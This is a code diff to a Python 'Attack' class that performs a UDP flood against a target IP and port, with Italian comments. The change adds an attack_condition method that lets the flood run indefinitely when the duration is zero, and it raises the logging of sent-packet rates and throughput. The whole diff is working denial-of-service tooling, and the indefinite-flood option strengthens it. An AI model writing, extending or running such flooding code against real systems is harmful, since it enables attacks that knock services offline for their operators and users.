@@ -22,6 +22,14 @@ class Attack:
         self.packet_size = packet_size
         self.delay = delay
 
+
+    def attack_condition(self):
+        if self.duration == 0:
+            return True
+        else:
+            return time.time() < self.end_time
+
+
     def start_attack(self):
         """
         Esegui un attacco UDP flood sul target specificato.
@@ -35,24 +43,29 @@ class Attack:
         packets_sent = 0
         bytes_sent = 0
         start_time = time.time()
-        end_time = start_time + self.duration
+        self.end_time = start_time + self.duration
 
         logger.debug(f"Starting UDP flood to {self.target_ip}:{self.target_port}")
-        logger.debug(f"Test will run for {self.duration} seconds")
+        if self.duration != 0:
+            logger.debug(f"Test will run for {self.duration} seconds")
+        else:
+            logger.debug(f"Attack will continue until stopped by user.")
+
         logger.debug(f"Packet size: {self.packet_size} bytes")
 
         try:
-            while time.time() < end_time:
+            
+            while self.attack_condition():
                 sock.sendto(data, (self.target_ip, self.target_port))
                 packets_sent += 1
                 bytes_sent += self.packet_size
 
-                # Stampa le statistiche ogni 1000 pacchetti
-                if packets_sent % 1000 == 0:
+                # Stampa le statistiche ogni 10000 pacchetti
+                if packets_sent % 10000 == 0:
                     elapsed = time.time() - start_time
                     rate = packets_sent / elapsed if elapsed > 0 else 0
                     mbps = (bytes_sent * 8 / 1000000) / elapsed if elapsed > 0 else 0
-                    logger.debug(f"Sent {packets_sent} packets, {bytes_sent/1000000:.2f} MB ({rate:.2f} pps, {mbps:.2f} Mbps)")
+                    logger.info(f"Sent {packets_sent} packets, {bytes_sent/1000000:.2f} MB ({rate:.2f} pps, {mbps:.2f} Mbps)")
 
                 # Aggiungi un ritardo tra i pacchetti se specificato
                 if self.delay > 0:
